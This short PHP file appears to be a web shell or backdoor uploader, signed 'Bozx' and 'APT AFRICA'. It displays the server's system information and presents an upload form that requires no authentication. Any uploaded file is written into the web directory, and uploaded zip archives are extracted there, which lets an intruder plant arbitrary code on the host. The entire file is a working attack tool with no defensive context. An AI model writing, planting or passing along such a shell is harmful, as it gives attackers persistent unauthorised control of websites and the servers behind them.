<?php
echo '<b>Server Bilgi<br><br>'.php_uname().'<br> </b> // Bozx';
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
$file = $_FILES['file']['name'];
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
$zip = new ZipArchive;
if ($zip->open($file) === TRUE) {
    $zip->extractTo('./');
    $zip->close();
echo '';
} else {
echo 'Msec.';
}
}else{
echo '<b>APT AFRICA</b><br><br>';
}
}
